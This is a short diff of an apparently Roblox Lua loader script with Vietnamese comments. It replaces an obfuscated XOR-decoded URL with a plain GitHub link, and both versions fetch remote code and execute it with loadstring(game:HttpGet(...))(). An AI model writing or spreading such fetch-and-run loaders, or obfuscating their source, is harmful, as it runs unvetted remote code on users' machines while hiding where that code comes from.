@@ -1,16 +1,26 @@
-local _d = {44,165,206,66,79,203,176,173,169,157,4,98,45,173,55,209,243,96,160,7,163,43,53,103,30,69,193,32,68,210,93,204}
-local _k = {173,59,201,88,142}
+-- Script cũ - thông báo và chạy script mới
+local oldScript = "https://raw.githubusercontent.com/KimLong-Valencia/REAL/refs/heads/main/FishinMasterV3.txt"
 
-local function _r(t)
-    local n, o = #t, {}
-    for i = 1, n do
-        local v = t[n - i + 1]
-        v = (v - i * 7) % 256
-        v = bit32.bxor(v, _k[(i - 1) % #_k + 1])
-        o[i] = string.char(v)
-    end
-    return table.concat(o)
+-- Thông báo cho người dùng
+local StarterGui = game:GetService("StarterGui")
+StarterGui:SetCore("SendNotification", {
+    Title = "Script đã cũ",
+    Text = "Script này đã lỗi thời. Đang tải script mới...",
+    Duration = 5
+})
+
+-- Chờ một chút để thông báo hiển thị
+task.wait(2)
+
+-- Chạy script mới
+local success, err = pcall(function()
+    loadstring(game:HttpGet(oldScript))()
+end)
+
+if not success then
+    StarterGui:SetCore("SendNotification", {
+        Title = "Lỗi",
+        Text = "Không thể tải script mới: " .. tostring(err),
+        Duration = 5
+    })
 end
-
-local _u = _r(_d)
-loadstring(game:HttpGet(_u))()
